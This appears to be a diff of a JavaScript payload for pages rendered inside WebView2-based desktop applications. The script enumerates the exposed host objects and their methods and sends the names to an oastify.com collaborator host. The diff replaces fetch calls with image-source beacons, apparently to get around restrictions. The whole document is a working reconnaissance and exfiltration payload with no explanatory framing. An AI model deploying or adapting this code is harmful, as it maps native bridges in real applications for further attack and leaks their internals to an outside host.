@@ -1,15 +1,15 @@
 <script>
-  (async () => {
+  (() => {
   try {
     const hostObjects = window.chrome?.webview?.hostObjects;
     if (!hostObjects) {
-      await fetch('https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/no-hostobjects');
+      new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/no-hostobjects';
       return;
     }
 
     const keys = Object.keys(hostObjects);
     if (keys.length === 0) {
-      await fetch('https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/empty');
+      new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/empty';
       return;
     }
 
@@ -19,15 +19,10 @@
         methods.push(prop);
       }
 
-      const data = {
-        object: key,
-        methods: methods
-      };
-
-      await fetch(`https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/${key}?methods=${encodeURIComponent(methods.join(","))}`);
+      new Image().src = `https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/${key}?methods=${encodeURIComponent(methods.join(","))}`;
     }
   } catch (e) {
-    await fetch('https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/error?msg=' + encodeURIComponent(e.message));
+    new Image().src = 'https://zpsaoqfhj88e3qfypvqey67bo2utim6b.oastify.com/error?msg=' + encodeURIComponent(e.message);
   }
 })();
 
